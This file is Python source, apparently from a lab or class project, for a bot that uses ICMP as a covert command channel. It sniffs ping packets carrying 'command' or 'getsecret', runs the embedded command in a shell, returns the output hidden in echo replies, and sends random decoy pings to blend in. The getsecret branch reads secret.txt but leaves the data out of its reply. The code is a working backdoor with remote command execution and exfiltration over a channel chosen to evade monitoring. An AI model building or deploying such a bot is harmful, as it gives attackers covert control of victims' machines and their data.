import socket
import time
import os
import random
import subprocess
from multiprocessing import Process
import requests
from scapy.all import *
from scapy.layers.inet import ICMP, IP

destIP = 'localhost'
srcIP = 'localhost'
interface = '\\Device\\NPF_Loopback'

receivedResponse = False

def sendGetRequest():
    address = destIP
    r = requests.get(url=address)


def sendPostRequest():
    address = destIP
    data = ''
    r = requests.post(url=address, data=data)


def sendICMPPing():
    address = destIP
    response = os.system("ping -c 1 " + address)


def dnsARecord():
    address = destIP
    site = 'example.com'
    os.system('dig @' + address + ' ' + site)


def processPacket(packet):
    if packet[ICMP].type == 8:
        if Raw in packet:
            data = packet[Raw].load.decode()
            if 'getsecret' in data:
                processSecret(packet)
            if 'command' in data:
                processCommand(packet)

def processSecret(packet):
    with open('secret.txt') as f:
        string = "botreply" + f.readline()
    time.sleep(1)
    send(IP(dst=destIP, src=srcIP) / ICMP(type=0) )

def processCommand(packet):
    command = packet[Raw].load.decode()[7:]
    print(command)
    #return value of os.system?
    returnStatement = subprocess.check_output(command, shell = True).decode()
    returnStatement = "botreply" + returnStatement
    time.sleep(1)
    send(IP(dst=destIP, src=srcIP) / ICMP(type=0) / returnStatement.encode())


def sniffForPacket():
    sniff(iface=interface, prn=processPacket, filter='icmp')


# functionList = [sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]

functionList = [sendICMPPing]


if __name__ == '__main__':
    p = Process(target=sniffForPacket)
    p.start()

    while True:
        waitTime = random.randint(1, 10)
        time.sleep(waitTime)
        random.choice(functionList)()